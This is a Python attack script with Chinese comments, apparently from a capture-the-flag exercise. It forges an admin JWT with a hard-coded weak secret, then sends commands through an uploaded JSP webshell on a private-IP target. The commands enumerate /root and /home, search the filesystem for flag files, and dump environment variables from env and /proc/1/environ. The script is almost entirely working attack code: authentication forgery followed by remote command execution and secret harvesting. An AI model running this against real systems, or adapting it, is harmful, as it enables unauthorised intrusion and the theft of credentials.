#!/usr/bin/env python3
"""
使用 webshell 执行命令
"""

import jwt
import requests
import urllib.parse

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

shell_url = f"{TARGET}/uploads/shell.jsp"

def execute_cmd(cmd):
    """执行命令"""
    try:
        r = requests.get(f"{shell_url}?cmd={urllib.parse.quote(cmd)}", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.text
        else:
            return f"[Error] Status: {r.status_code}"
    except Exception as e:
        return f"[Exception] {e}"

print("[+] Webshell 已连接\n")

# 执行一系列命令来探索系统
commands = [
    ("id", "查看当前用户"),
    ("pwd", "当前目录"),
    ("ls -la /", "列出根目录"),
    ("ls -la /root", "列出 /root"),
    ("ls -la /home", "列出 /home"),
    ("ls -la /tmp", "列出 /tmp"),
    ("find / -name '*flag*' 2>/dev/null", "搜索 flag 文件"),
    ("find / -name 'flag*' 2>/dev/null | head -20", "搜索 flag 开头的文件"),
    ("find / -name '*flag.txt' 2>/dev/null", "搜索 flag.txt"),
    ("cat /proc/1/environ", "查看容器环境变量"),
    ("env", "查看环境变量"),
]

for cmd, desc in commands:
    print(f"[*] {desc}")
    print(f"    执行: {cmd}")
    result = execute_cmd(cmd)
    print(f"{result}\n")
    print("=" * 80 + "\n")
    
    # 如果在结果中发现 flag 相关信息，停止并报告
    if "flag" in result.lower() and len(result) < 1000:
        print(f"[!] 发现可能的 flag 相关信息!")

print("\n[+] 命令执行完成")
print("[*] 你可以使用以下 URL 手动执行命令:")
print(f"    {shell_url}?cmd=YOUR_COMMAND")
